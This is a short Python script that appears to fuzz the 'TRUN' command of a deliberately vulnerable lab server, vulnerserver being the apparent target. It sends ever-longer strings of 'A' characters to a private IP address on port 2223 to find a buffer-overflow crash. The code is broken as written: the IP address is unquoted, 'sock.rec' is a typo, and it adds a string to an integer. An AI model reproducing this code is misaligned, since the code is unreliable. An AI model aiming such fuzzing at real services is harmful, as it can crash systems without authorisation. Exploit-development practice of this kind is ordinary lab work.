import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((192.168.199.122, 2223))
msg = sock.rec(2048).decode()
print(msg)
for i in range(12100):
	badstr = "A" + i
	cmd = "TRUN ." + badstr
	print("Trying length " + str(i))
	sock.send(cmd.encode())
	msg = sock.recv(2048).decode()
	print(msg)
sock.close()